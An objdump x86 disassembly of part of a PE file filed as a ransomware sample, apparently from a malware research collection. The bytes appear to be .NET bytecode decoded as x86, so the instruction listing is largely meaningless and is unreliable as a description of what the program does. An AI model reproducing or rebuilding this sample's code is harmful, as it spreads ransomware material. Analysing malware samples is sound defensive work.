
malware_samples/ransomware/1d1b08a2f0b09dd0f0a85439d62800bb8c3a3b8dfa0afa9ba7f9c477b8dbd6b5.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	20 a3 00 00 00 00    	and    %ah,0x0(%ebx)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 00 57 00    	add    %al,0x570000
  402013:	00 ec                	add    %ch,%ah
  402015:	4b                   	dec    %ebx
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	77 00                	ja     0x40201e
  40201e:	00 06                	add    %al,(%esi)
  402020:	10 4a 00             	adc    %cl,0x0(%edx)
  402023:	00 ed                	add    %ch,%ch
  402025:	0c 00                	or     $0x0,%al
	...
  40204f:	00 13                	add    %dl,(%ebx)
  402051:	30 0a                	xor    %cl,(%edx)
  402053:	00 ce                	add    %cl,%dh
  402055:	00 00                	add    %al,(%eax)
  402057:	00 01                	add    %al,(%ecx)
  402059:	00 00                	add    %al,(%eax)
  40205b:	11 72 01             	adc    %esi,0x1(%edx)
  40205e:	00 00                	add    %al,(%eax)
  402060:	70 20                	jo     0x402082
  402062:	80 00 00             	addb   $0x0,(%eax)
  402065:	00 73 0c             	add    %dh,0xc(%ebx)
  402068:	00 00                	add    %al,(%eax)
  40206a:	0a 0a                	or     (%edx),%cl
  40206c:	05 20 80 00 00       	add    $0x8020,%eax
  402071:	00 73 0c             	add    %dh,0xc(%ebx)
  402074:	00 00                	add    %al,(%eax)
  402076:	0a 0b                	or     (%ebx),%cl
  402078:	12 02                	adc    (%edx),%al
  40207a:	fe                   	(bad)
  40207b:	15 03 00 00 02       	adc    $0x2000003,%eax
  402080:	03 28                	add    (%eax),%ebp
  402082:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  402087:	08 12                	or     %dl,(%edx)
  402089:	02 03                	add    (%ebx),%al
  40208b:	7d 03                	jge    0x402090
  40208d:	00 00                	add    %al,(%eax)
  40208f:	04 02                	add    $0x2,%al
  402091:	28 0d 00 00 0a 2d    	sub    %cl,0x2d0a0000
  402097:	08 12                	or     %dl,(%edx)
  402099:	02 02                	add    (%edx),%al
  40209b:	7d 04                	jge    0x4020a1
  40209d:	00 00                	add    %al,(%eax)
  40209f:	04 12                	add    $0x12,%al
  4020a1:	02 08                	add    (%eax),%cl
  4020a3:	28 01                	sub    %al,(%ecx)
  4020a5:	00 00                	add    %al,(%eax)
  4020a7:	2b 7d 01             	sub    0x1(%ebp),%edi
  4020aa:	00 00                	add    %al,(%eax)
  4020ac:	04 16                	add    $0x16,%al
  4020ae:	0d 18 13 04 0e       	or     $0xe041318,%eax
  4020b3:	04 17                	add    $0x17,%al
  4020b5:	5f                   	pop    %edi
  4020b6:	17                   	pop    %ss
  4020b7:	33 1b                	xor    (%ebx),%ebx
  4020b9:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  4020bc:	00 00                	add    %al,(%eax)
  4020be:	04 00                	add    $0x0,%al
  4020c0:	60                   	pusha
  4020c1:	13 04 0e             	adc    (%esi,%ecx,1),%eax
  4020c4:	05 18 5f 18 33       	add    $0x33185f18,%eax
  4020c9:	0a 11                	or     (%ecx),%dl
  4020cb:	04 20                	add    $0x20,%al
  4020cd:	80 00 00             	addb   $0x0,(%eax)
  4020d0:	00 60 13             	add    %ah,0x13(%eax)
  4020d3:	04 12                	add    $0x12,%al
  4020d5:	02 04 7e             	add    (%esi,%edi,2),%al
  4020d8:	0f 00 00             	sldt   (%eax)
  4020db:	0a 16                	or     (%esi),%dl
  4020dd:	07                   	pop    %es
  4020de:	20 80 00 00 00 06    	and    %al,0x6000000(%eax)
  4020e4:	20 80 00 00 00 12    	and    %al,0x12000000(%eax)
  4020ea:	03 11                	add    (%ecx),%edx
  4020ec:	04 28                	add    $0x28,%al
  4020ee:	01 00                	add    %eax,(%eax)
  4020f0:	00 06                	add    %al,(%esi)
  4020f2:	13 05 11 05 2d 30    	adc    0x302d0511,%eax
  4020f8:	73 04                	jae    0x4020fe
  4020fa:	00 00                	add    %al,(%eax)
  4020fc:	06                   	push   %es
  4020fd:	13 06                	adc    (%esi),%eax
  4020ff:	11 06                	adc    %eax,(%esi)
  402101:	07                   	pop    %es
  402102:	6f                   	outsl  %ds:(%esi),(%dx)
  402103:	10 00                	adc    %al,(%eax)
  402105:	00 0a                	add    %cl,(%edx)
  402107:	7d 21                	jge    0x40212a
  402109:	00 00                	add    %al,(%eax)
  40210b:	04 11                	add    $0x11,%al
  40210d:	06                   	push   %es
  40210e:	06                   	push   %es
  40210f:	6f                   	outsl  %ds:(%esi),(%dx)
  402110:	10 00                	adc    %al,(%eax)
  402112:	00 0a                	add    %cl,(%edx)
  402114:	7d 22                	jge    0x402138
  402116:	00 00                	add    %al,(%eax)
  402118:	04 11                	add    $0x11,%al
  40211a:	06                   	push   %es
  40211b:	72 01                	jb     0x40211e
  40211d:	00 00                	add    %al,(%eax)
  40211f:	70 7d                	jo     0x40219e
  402121:	23 00                	and    (%eax),%eax
  402123:	00 04 11             	add    %al,(%ecx,%edx,1)
  402126:	06                   	push   %es
  402127:	2a 14 2a             	sub    (%edx,%ebp,1),%dl
  40212a:	1e                   	push   %ds
  40212b:	02 28                	add    (%eax),%ch
  40212d:	11 00                	adc    %eax,(%eax)
  40212f:	00 0a                	add    %cl,(%edx)
  402131:	2a a2 02 7e 14 00    	sub    0x147e02(%edx),%ah
  402137:	00 0a                	add    %cl,(%edx)
  402139:	7d 21                	jge    0x40215c
  40213b:	00 00                	add    %al,(%eax)
  40213d:	04 02                	add    $0x2,%al
  40213f:	7e 14                	jle    0x402155
  402141:	00 00                	add    %al,(%eax)
  402143:	0a 7d 22             	or     0x22(%ebp),%bh
  402146:	00 00                	add    %al,(%eax)
  402148:	04 02                	add    $0x2,%al
  40214a:	7e 14                	jle    0x402160
  40214c:	00 00                	add    %al,(%eax)
  40214e:	0a 7d 23             	or     0x23(%ebp),%bh
  402151:	00 00                	add    %al,(%eax)
  402153:	04 02                	add    $0x2,%al
  402155:	28 11                	sub    %dl,(%ecx)
  402157:	00 00                	add    %al,(%eax)
  402159:	0a 2a                	or     (%edx),%ch
  40215b:	1e                   	push   %ds
  40215c:	02 7b 24             	add    0x24(%ebx),%bh
  40215f:	00 00                	add    %al,(%eax)
  402161:	04 2a                	add    $0x2a,%al
  402163:	22 02                	and    (%edx),%al
  402165:	03 7d 24             	add    0x24(%ebp),%edi
  402168:	00 00                	add    %al,(%eax)
  40216a:	04 2a                	add    $0x2a,%al
  40216c:	2a 1f                	sub    (%edi),%bl
  40216e:	78 1f                	js     0x40218f
  402170:	32 73 15             	xor    0x15(%ebx),%dh
  402173:	00 00                	add    %al,(%eax)
  402175:	0a 2a                	or     (%edx),%ch
  402177:	06                   	push   %es
  402178:	2a 22                	sub    (%edx),%ah
  40217a:	16                   	push   %ss
  40217b:	16                   	push   %ss
  40217c:	73 16                	jae    0x402194
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 2a                	or     (%edx),%ch
  402182:	06                   	push   %es
  402183:	2a 0e                	sub    (%esi),%cl
  402185:	1f                   	pop    %ds
  402186:	19 2a                	sbb    %ebp,(%edx)
  402188:	06                   	push   %es
  402189:	2a 00                	sub    (%eax),%al
  40218b:	00 03                	add    %al,(%ebx)
  40218d:	30 02                	xor    %al,(%edx)
  40218f:	00 53 00             	add    %dl,0x0(%ebx)
  402192:	00 00                	add    %al,(%eax)
  402194:	00 00                	add    %al,(%eax)
  402196:	00 00                	add    %al,(%eax)
  402198:	02 7b 26             	add    0x26(%ebx),%bh
  40219b:	00 00                	add    %al,(%eax)
  40219d:	04 2c                	add    $0x2c,%al
  40219f:	13 02                	adc    (%edx),%eax
  4021a1:	7b 26                	jnp    0x4021c9
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	04 6f                	add    $0x6f,%al
  4021a7:	17                   	pop    %ss
  4021a8:	00 00                	add    %al,(%eax)
  4021aa:	0a 02                	or     (%edx),%al
  4021ac:	14 7d                	adc    $0x7d,%al
  4021ae:	26 00 00             	add    %al,%es:(%eax)
  4021b1:	04 2a                	add    $0x2a,%al
  4021b3:	02 73 18             	add    0x18(%ebx),%dh
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	0a 7d 26             	or     0x26(%ebp),%bh
  4021bb:	00 00                	add    %al,(%eax)
  4021bd:	04 02                	add    $0x2,%al
  4021bf:	7b 26                	jnp    0x4021e7
  4021c1:	00 00                	add    %al,(%eax)
  4021c3:	04 23                	add    $0x23,%al
	...
  4021cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ce:	19 00                	sbb    %eax,(%eax)
  4021d0:	00 0a                	add    %cl,(%edx)
  4021d2:	02 7b 26             	add    0x26(%ebx),%bh
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	04 16                	add    $0x16,%al
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	1a 00                	sbb    (%eax),%al
  4021dc:	00 0a                	add    %cl,(%edx)
  4021de:	02 7b 26             	add    0x26(%ebx),%bh
  4021e1:	00 00                	add    %al,(%eax)
  4021e3:	04 17                	add    $0x17,%al
  4021e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4021e6:	1b 00                	sbb    (%eax),%eax
  4021e8:	00 0a                	add    %cl,(%edx)
  4021ea:	2a 1e                	sub    (%esi),%bl
  4021ec:	02 7b 25             	add    0x25(%ebx),%bh
  4021ef:	00 00                	add    %al,(%eax)
  4021f1:	04 2a                	add    $0x2a,%al
  4021f3:	22 02                	and    (%edx),%al
  4021f5:	03 7d 25             	add    0x25(%ebp),%edi
  4021f8:	00 00                	add    %al,(%eax)
  4021fa:	04 2a                	add    $0x2a,%al
  4021fc:	13 30                	adc    (%eax),%esi
  4021fe:	05 00 7f 00 00       	add    $0x7f00,%eax
  402203:	00 02                	add    %al,(%edx)
  402205:	00 00                	add    %al,(%eax)
  402207:	11 0f                	adc    %ecx,(%edi)
  402209:	01 28                	add    %ebp,(%eax)
  40220b:	1c 00                	sbb    $0x0,%al
  40220d:	00 0a                	add    %cl,(%edx)
  40220f:	0f 01                	(bad)
  402211:	28 1d 00 00 0a 59    	sub    %bl,0x590a0000
  402217:	17                   	pop    %ss
  402218:	58                   	pop    %eax
  402219:	0f 01                	(bad)
  40221b:	28 1e                	sub    %bl,(%esi)
  40221d:	00 00                	add    %al,(%eax)
  40221f:	0a 0f                	or     (%edi),%cl
  402221:	01 28                	add    %ebp,(%eax)
  402223:	1f                   	pop    %ds
  402224:	00 00                	add    %al,(%eax)
  402226:	0a 59 17             	or     0x17(%ecx),%bl
  402229:	58                   	pop    %eax
  40222a:	73 20                	jae    0x40224c
  40222c:	00 00                	add    %al,(%eax)
  40222e:	0a 0a                	or     (%edx),%cl
  402230:	16                   	push   %ss
  402231:	0b 2b                	or     (%ebx),%ebp
  402233:	3f                   	aas
  402234:	16                   	push   %ss
  402235:	0c 2b                	or     $0x2b,%al
  402237:	25 06 07 08 28       	and    $0x28080706,%eax
  40223c:	21 00                	and    %eax,(%eax)
  40223e:	00 0a                	add    %cl,(%edx)
  402240:	1f                   	pop    %ds
  402241:	20 02                	and    %al,(%edx)
  402243:	7b 25                	jnp    0x40226a
  402245:	00 00                	add    %al,(%eax)
  402247:	04 02                	add    $0x2,%al
  402249:	7b 24                	jnp    0x40226f
  40224b:	00 00                	add    %al,(%eax)
  40224d:	04 16                	add    $0x16,%al
  40224f:	73 22                	jae    0x402273
  402251:	00 00                	add    %al,(%eax)
  402253:	0a 81 0e 00 00 01    	or     0x100000e(%ecx),%al
  402259:	08 17                	or     %dl,(%edi)
  40225b:	58                   	pop    %eax
  40225c:	0c 08                	or     $0x8,%al
  40225e:	0f 01                	(bad)
  402260:	28 1e                	sub    %bl,(%esi)
  402262:	00 00                	add    %al,(%eax)
  402264:	0a 0f                	or     (%edi),%cl
  402266:	01 28                	add    %ebp,(%eax)
  402268:	1f                   	pop    %ds
  402269:	00 00                	add    %al,(%eax)
  40226b:	0a 59 31             	or     0x31(%ecx),%bl
  40226e:	c9                   	leave
  40226f:	07                   	pop    %es
  402270:	17                   	pop    %ss
  402271:	58                   	pop    %eax
  402272:	0b 07                	or     (%edi),%eax
  402274:	0f 01                	(bad)
  402276:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	0f 01                	(bad)
  40227d:	28 1d 00 00 0a 59    	sub    %bl,0x590a0000
  402283:	31 af 06 2a 0a 17    	xor    %ebp,0x170a2a06(%edi)
  402289:	2a 36                	sub    (%esi),%dh
  40228b:	20 f0                	and    %dh,%al
  40228d:	00 00                	add    %al,(%eax)
  40228f:	00 1f                	add    %bl,(%edi)
  402291:	54                   	push   %esp
  402292:	73 15                	jae    0x4022a9
  402294:	00 00                	add    %al,(%eax)
  402296:	0a 2a                	or     (%edx),%ch
  402298:	2a 1f                	sub    (%edi),%bl
  40229a:	78 1f                	js     0x4022bb
  40229c:	54                   	push   %esp
  40229d:	73 15                	jae    0x4022b4
  40229f:	00 00                	add    %al,(%eax)
  4022a1:	0a 2a                	or     (%edx),%ch
  4022a3:	9e                   	sahf
  4022a4:	03 1a                	add    (%edx),%ebx
  4022a6:	5f                   	pop    %edi
  4022a7:	2c 11                	sub    $0x11,%al
  4022a9:	72 01                	jb     0x4022ac
  4022ab:	00 00                	add    %al,(%eax)
  4022ad:	70 72                	jo     0x402321
  4022af:	01 00                	add    %eax,(%eax)
  4022b1:	00 70 17             	add    %dh,0x17(%eax)
  4022b4:	28 27                	sub    %ah,(%edi)
  4022b6:	00 00                	add    %al,(%eax)
  4022b8:	06                   	push   %es
  4022b9:	2a 72 01             	sub    0x1(%edx),%dh
  4022bc:	00 00                	add    %al,(%eax)
  4022be:	70 72                	jo     0x402332
  4022c0:	01 00                	add    %eax,(%eax)
  4022c2:	00 70 16             	add    %dh,0x16(%eax)
  4022c5:	28 27                	sub    %ah,(%edi)
  4022c7:	00 00                	add    %al,(%eax)
  4022c9:	06                   	push   %es
  4022ca:	2a 06                	sub    (%esi),%al
  4022cc:	2a 06                	sub    (%esi),%al
  4022ce:	2a 06                	sub    (%esi),%al
  4022d0:	2a 00                	sub    (%eax),%al
  4022d2:	00 00                	add    %al,(%eax)
  4022d4:	13 30                	adc    (%eax),%esi
  4022d6:	02 00                	add    (%eax),%al
  4022d8:	1a 00                	sbb    (%eax),%al
  4022da:	00 00                	add    %al,(%eax)
  4022dc:	03 00                	add    (%eax),%eax
  4022de:	00 11                	add    %dl,(%ecx)
  4022e0:	12 00                	adc    (%eax),%al
  4022e2:	fe                   	(bad)
  4022e3:	15 0d 00 00 01       	adc    $0x100000d,%eax
  4022e8:	12 00                	adc    (%eax),%al
  4022ea:	16                   	push   %ss
  4022eb:	28 23                	sub    %ah,(%ebx)
  4022ed:	00 00                	add    %al,(%eax)
  4022ef:	0a 12                	or     (%edx),%dl
  4022f1:	00 16                	add    %dl,(%esi)
  4022f3:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4022f6:	00 0a                	add    %cl,(%edx)
  4022f8:	06                   	push   %es
  4022f9:	2a 06                	sub    (%esi),%al
  4022fb:	2a 13                	sub    (%ebx),%dl
  4022fd:	30 02                	xor    %al,(%edx)
  4022ff:	00 1c 00             	add    %bl,(%eax,%eax,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	04 00                	add    $0x0,%al
  402306:	00 11                	add    %dl,(%ecx)
  402308:	12 00                	adc    (%eax),%al
  40230a:	fe                   	(bad)
  40230b:	15 0c 00 00 01       	adc    $0x100000c,%eax
  402310:	12 00                	adc    (%eax),%al
  402312:	1f                   	pop    %ds
  402313:	32 28                	xor    (%eax),%ch
  402315:	25 00 00 0a 12       	and    $0x120a0000,%eax
  40231a:	00 1f                	add    %bl,(%edi)
  40231c:	78 28                	js     0x402346
  40231e:	26 00 00             	add    %al,%es:(%eax)
  402321:	0a 06                	or     (%esi),%al
  402323:	2a 06                	sub    (%esi),%al
  402325:	2a 2e                	sub    (%esi),%ch
  402327:	28 27                	sub    %ah,(%edi)
  402329:	00 00                	add    %al,(%eax)
  40232b:	0a 6f 28             	or     0x28(%edi),%ch
  40232e:	00 00                	add    %al,(%eax)
  402330:	0a 2a                	or     (%edx),%ch
  402332:	06                   	push   %es
  402333:	2a 3e                	sub    (%esi),%bh
  402335:	02 1f                	add    (%edi),%bl
  402337:	0f 7d                	(bad)
  402339:	24 00                	and    $0x0,%al
  40233b:	00 04 02             	add    %al,(%edx,%eax,1)
  40233e:	28 29                	sub    %ch,(%ecx)
  402340:	00 00                	add    %al,(%eax)
  402342:	0a 2a                	or     (%edx),%ch
  402344:	1b 30                	sbb    (%eax),%esi
  402346:	05 00 51 02 00       	add    $0x25100,%eax
  40234b:	00 05 00 00 11 73    	add    %al,0x73110000
  402351:	18 00                	sbb    %al,(%eax)
  402353:	00 0a                	add    %cl,(%edx)
  402355:	0a 06                	or     (%esi),%al
  402357:	22 00                	and    (%eax),%al
  402359:	00 c0                	add    %al,%al
  40235b:	40                   	inc    %eax
  40235c:	22 00                	and    (%eax),%al
  40235e:	00 50 41             	add    %dl,0x41(%eax)
  402361:	73 2a                	jae    0x40238d
  402363:	00 00                	add    %al,(%eax)
  402365:	0a 6f 2b             	or     0x2b(%edi),%ch
  402368:	00 00                	add    %al,(%eax)
  40236a:	0a 06                	or     (%esi),%al
  40236c:	17                   	pop    %ss
  40236d:	6f                   	outsl  %ds:(%esi),(%dx)
  40236e:	2c 00                	sub    $0x0,%al
  402370:	00 0a                	add    %cl,(%edx)
  402372:	73 2d                	jae    0x4023a1
  402374:	00 00                	add    %al,(%eax)
  402376:	0a 0b                	or     (%ebx),%cl
  402378:	73 2e                	jae    0x4023a8
  40237a:	00 00                	add    %al,(%eax)
  40237c:	0a 0c 73             	or     (%ebx,%esi,2),%cl
  40237f:	2f                   	das
  402380:	00 00                	add    %al,(%eax)
  402382:	0a 0d 73 2f 00 00    	or     0x2f73,%cl
  402388:	0a 13                	or     (%ebx),%dl
  40238a:	04 03                	add    $0x3,%al
  40238c:	28 0d 00 00 0a 2c    	sub    %cl,0x2c0a0000
  402392:	1d 05 2c 0d 07       	sbb    $0x70d2c05,%eax
  402397:	72 03                	jb     0x40239c
  402399:	00 00                	add    %al,(%eax)
  40239b:	70 6f                	jo     0x40240c
  40239d:	30 00                	xor    %al,(%eax)
  40239f:	00 0a                	add    %cl,(%edx)
  4023a1:	2b 14 07             	sub    (%edi,%eax,1),%edx
  4023a4:	72 25                	jb     0x4023cb
  4023a6:	00 00                	add    %al,(%eax)
  4023a8:	70 6f                	jo     0x402419
  4023aa:	30 00                	xor    %al,(%eax)
  4023ac:	00 0a                	add    %cl,(%edx)
  4023ae:	2b 07                	sub    (%edi),%eax
  4023b0:	07                   	pop    %es
  4023b1:	03 6f 30             	add    0x30(%edi),%ebp
  4023b4:	00 00                	add    %al,(%eax)
  4023b6:	0a 07                	or     (%edi),%al
  4023b8:	1f                   	pop    %ds
  4023b9:	09 1f                	or     %ebx,(%edi)
  4023bb:	13 73 31             	adc    0x31(%ebx),%esi
  4023be:	00 00                	add    %al,(%eax)
  4023c0:	0a 6f 32             	or     0x32(%edi),%ch
  4023c3:	00 00                	add    %al,(%eax)
  4023c5:	0a 07                	or     (%edi),%al
  4023c7:	06                   	push   %es
  4023c8:	28 33                	sub    %dh,(%ebx)
  4023ca:	00 00                	add    %al,(%eax)
  4023cc:	0a 6f 34             	or     0x34(%edi),%ch
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	0a 13                	or     (%ebx),%dl
  4023d3:	08 12                	or     %dl,(%edx)
  4023d5:	08 28                	or     %ch,(%eax)
  4023d7:	35 00 00 0a 1b       	xor    $0x1b0a0000,%eax
  4023dc:	5a                   	pop    %edx
  4023dd:	1e                   	push   %ds
  4023de:	5b                   	pop    %ebx
  4023df:	1f                   	pop    %ds
  4023e0:	12 59 16             	adc    0x16(%ecx),%bl
  4023e3:	73 36                	jae    0x40241b
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	0a 6f 37             	or     0x37(%edi),%ch
  4023ea:	00 00                	add    %al,(%eax)
  4023ec:	0a 07                	or     (%edi),%al
  4023ee:	17                   	pop    %ss
  4023ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f0:	38 00                	cmp    %al,(%eax)
  4023f2:	00 0a                	add    %cl,(%edx)
  4023f4:	06                   	push   %es
  4023f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f6:	39 00                	cmp    %eax,(%eax)
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	07                   	pop    %es
  4023fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4023fc:	3a 00                	cmp    (%eax),%al
  4023fe:	00 0a                	add    %cl,(%edx)
  402400:	05 2c 07 08 17       	add    $0x1708072c,%eax
  402405:	6f                   	outsl  %ds:(%esi),(%dx)
  402406:	3b 00                	cmp    (%eax),%eax
  402408:	00 0a                	add    %cl,(%edx)
  40240a:	08 04 50             	or     %al,(%eax,%edx,2)
  40240d:	6f                   	outsl  %ds:(%esi),(%dx)
  40240e:	30 00                	xor    %al,(%eax)
  402410:	00 0a                	add    %cl,(%edx)
  402412:	08 1f                	or     %bl,(%edi)
  402414:	0c 07                	or     $0x7,%al
  402416:	6f                   	outsl  %ds:(%esi),(%dx)
  402417:	3c 00                	cmp    $0x0,%al
  402419:	00 0a                	add    %cl,(%edx)
  40241b:	07                   	pop    %es
  40241c:	6f                   	outsl  %ds:(%esi),(%dx)
  40241d:	3d 00 00 0a 1f       	cmp    $0x1f0a0000,%eax
  402422:	0c 59                	or     $0x59,%al
  402424:	1f                   	pop    %ds
  402425:	14 6f                	adc    $0x6f,%al
  402427:	3e 00 00             	add    %al,%ds:(%eax)
  40242a:	0a 16                	or     (%esi),%dl
  40242c:	28 1f                	sub    %bl,(%edi)
  40242e:	00 00                	add    %al,(%eax)
  402430:	06                   	push   %es
  402431:	28 3f                	sub    %bh,(%edi)
  402433:	00 00                	add    %al,(%eax)
  402435:	0a 13                	or     (%ebx),%dl
  402437:	05 11 05 28 0d       	add    $0xd280511,%eax
  40243c:	00 00                	add    %al,(%eax)
  40243e:	0a 2c 0d 09 72 47 00 	or     0x477209(,%ecx,1),%ch
  402445:	00 70 6f             	add    %dh,0x6f(%eax)
  402448:	30 00                	xor    %al,(%eax)
  40244a:	00 0a                	add    %cl,(%edx)
  40244c:	2b 08                	sub    (%eax),%ecx
  40244e:	09 11                	or     %edx,(%ecx)
  402450:	05 6f 30 00 00       	add    $0x306f,%eax
  402455:	0a 17                	or     (%edi),%dl
  402457:	28 1f                	sub    %bl,(%edi)
  402459:	00 00                	add    %al,(%eax)
  40245b:	06                   	push   %es
  40245c:	28 3f                	sub    %bh,(%edi)
  40245e:	00 00                	add    %al,(%eax)
  402460:	0a 13                	or     (%ebx),%dl
  402462:	06                   	push   %es
  402463:	11 06                	adc    %eax,(%esi)
  402465:	28 0d 00 00 0a 2c    	sub    %cl,0x2c0a0000
  40246b:	0e                   	push   %cs
  40246c:	11 04 72             	adc    %eax,(%edx,%esi,2)
  40246f:	4d                   	dec    %ebp
  402470:	00 00                	add    %al,(%eax)
  402472:	70 6f                	jo     0x4024e3
  402474:	30 00                	xor    %al,(%eax)
  402476:	00 0a                	add    %cl,(%edx)
  402478:	2b 09                	sub    (%ecx),%ecx
  40247a:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  40247d:	06                   	push   %es
  40247e:	6f                   	outsl  %ds:(%esi),(%dx)
  40247f:	30 00                	xor    %al,(%eax)
  402481:	00 0a                	add    %cl,(%edx)
  402483:	09 17                	or     %edx,(%edi)
  402485:	6f                   	outsl  %ds:(%esi),(%dx)
  402486:	40                   	inc    %eax
  402487:	00 00                	add    %al,(%eax)
  402489:	0a 11                	or     (%ecx),%dl
  40248b:	04 18                	add    $0x18,%al
  40248d:	6f                   	outsl  %ds:(%esi),(%dx)
  40248e:	40                   	inc    %eax
  40248f:	00 00                	add    %al,(%eax)
  402491:	0a 09                	or     (%ecx),%cl
  402493:	1f                   	pop    %ds
  402494:	0c 07                	or     $0x7,%al
  402496:	6f                   	outsl  %ds:(%esi),(%dx)
  402497:	3d 00 00 0a 20       	cmp    $0x200a0000,%eax
  40249c:	9e                   	sahf
  40249d:	00 00                	add    %al,(%eax)
  40249f:	00 59 28             	add    %bl,0x28(%ecx)
  4024a2:	41                   	inc    %ecx
  4024a3:	00 00                	add    %al,(%eax)
  4024a5:	0a 07                	or     (%edi),%al
  4024a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024a8:	3c 00                	cmp    $0x0,%al
  4024aa:	00 0a                	add    %cl,(%edx)
  4024ac:	1f                   	pop    %ds
  4024ad:	24 58                	and    $0x58,%al
  4024af:	1f                   	pop    %ds
  4024b0:	4b                   	dec    %ebx
  4024b1:	1f                   	pop    %ds
  4024b2:	17                   	pop    %ss
  4024b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4024b4:	3e 00 00             	add    %al,%ds:(%eax)
  4024b7:	0a 11                	or     (%ecx),%dl
  4024b9:	04 1f                	add    $0x1f,%al
  4024bb:	5d                   	pop    %ebp
  4024bc:	07                   	pop    %es
  4024bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4024be:	3d 00 00 0a 1f       	cmp    $0x1f0a0000,%eax
  4024c3:	4d                   	dec    %ebp
  4024c4:	59                   	pop    %ecx
  4024c5:	28 41 00             	sub    %al,0x0(%ecx)
  4024c8:	00 0a                	add    %cl,(%edx)
  4024ca:	07                   	pop    %es
  4024cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4024cc:	3c 00                	cmp    $0x0,%al
  4024ce:	00 0a                	add    %cl,(%edx)
  4024d0:	1f                   	pop    %ds
  4024d1:	24 58                	and    $0x58,%al
  4024d3:	1f                   	pop    %ds
  4024d4:	4b                   	dec    %ebx
  4024d5:	1f                   	pop    %ds
  4024d6:	17                   	pop    %ss
  4024d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024d8:	3e 00 00             	add    %al,%ds:(%eax)
  4024db:	0a 02                	or     (%edx),%al
  4024dd:	28 0d 00 00 0a 2c    	sub    %cl,0x2c0a0000
  4024e3:	12 06                	adc    (%esi),%al
  4024e5:	28 27                	sub    %ah,(%edi)
  4024e7:	00 00                	add    %al,(%eax)
  4024e9:	0a 6f 28             	or     0x28(%edi),%ch
  4024ec:	00 00                	add    %al,(%eax)
  4024ee:	0a 6f 30             	or     0x30(%edi),%ch
  4024f1:	00 00                	add    %al,(%eax)
  4024f3:	0a 2b                	or     (%ebx),%ch
  4024f5:	07                   	pop    %es
  4024f6:	06                   	push   %es
  4024f7:	02 6f 30             	add    0x30(%edi),%ch
  4024fa:	00 00                	add    %al,(%eax)
  4024fc:	0a 06                	or     (%esi),%al
  4024fe:	20 b2 00 00 00 07    	and    %dh,0x7000000(%edx)
  402504:	6f                   	outsl  %ds:(%esi),(%dx)
  402505:	3d 00 00 0a 1f       	cmp    $0x1f0a0000,%eax
  40250a:	0a 58 28             	or     0x28(%eax),%bl
  40250d:	41                   	inc    %ecx
  40250e:	00 00                	add    %al,(%eax)
  402510:	0a 07                	or     (%edi),%al
  402512:	6f                   	outsl  %ds:(%esi),(%dx)
  402513:	3c 00                	cmp    $0x0,%al
  402515:	00 0a                	add    %cl,(%edx)
  402517:	1f                   	pop    %ds
  402518:	47                   	inc    %edi
  402519:	58                   	pop    %eax
  40251a:	73 36                	jae    0x402552
  40251c:	00 00                	add    %al,(%eax)
  40251e:	0a 6f 42             	or     0x42(%edi),%ch
  402521:	00 00                	add    %al,(%eax)
  402523:	0a 06                	or     (%esi),%al
  402525:	6f                   	outsl  %ds:(%esi),(%dx)
  402526:	39 00                	cmp    %eax,(%eax)
  402528:	00 0a                	add    %cl,(%edx)
  40252a:	19 8d 39 00 00 01    	sbb    %ecx,0x1000039(%ebp)
  402530:	13 09                	adc    (%ecx),%ecx
  402532:	11 09                	adc    %ecx,(%ecx)
  402534:	16                   	push   %ss
  402535:	08 a2 11 09 17 09    	or     %ah,0x9170911(%edx)
  40253b:	a2 11 09 18 11       	mov    %al,0x11180911
  402540:	04 a2                	add    $0xa2,%al
  402542:	11 09                	adc    %ecx,(%ecx)
  402544:	6f                   	outsl  %ds:(%esi),(%dx)
  402545:	43                   	inc    %ebx
  402546:	00 00                	add    %al,(%eax)
  402548:	0a 06                	or     (%esi),%al
  40254a:	19 6f 44             	sbb    %ebp,0x44(%edi)
  40254d:	00 00                	add    %al,(%eax)
  40254f:	0a 06                	or     (%esi),%al
  402551:	17                   	pop    %ss
  402552:	6f                   	outsl  %ds:(%esi),(%dx)
  402553:	45                   	inc    %ebp
  402554:	00 00                	add    %al,(%eax)
  402556:	0a 06                	or     (%esi),%al
  402558:	28 46 00             	sub    %al,0x0(%esi)
  40255b:	00 0a                	add    %cl,(%edx)
  40255d:	6f                   	outsl  %ds:(%esi),(%dx)
  40255e:	47                   	inc    %edi
  40255f:	00 00                	add    %al,(%eax)
  402561:	0a 28                	or     (%eax),%ch
  402563:	48                   	dec    %eax
  402564:	00 00                	add    %al,(%eax)
  402566:	0a 6f 49             	or     0x49(%edi),%ch
  402569:	00 00                	add    %al,(%eax)
  40256b:	0a de                	or     %dh,%bl
  40256d:	03 26                	add    (%esi),%esp
  40256f:	de 00                	fiadds (%eax)
  402571:	06                   	push   %es
  402572:	16                   	push   %ss
  402573:	6f                   	outsl  %ds:(%esi),(%dx)
  402574:	4a                   	dec    %edx
  402575:	00 00                	add    %al,(%eax)
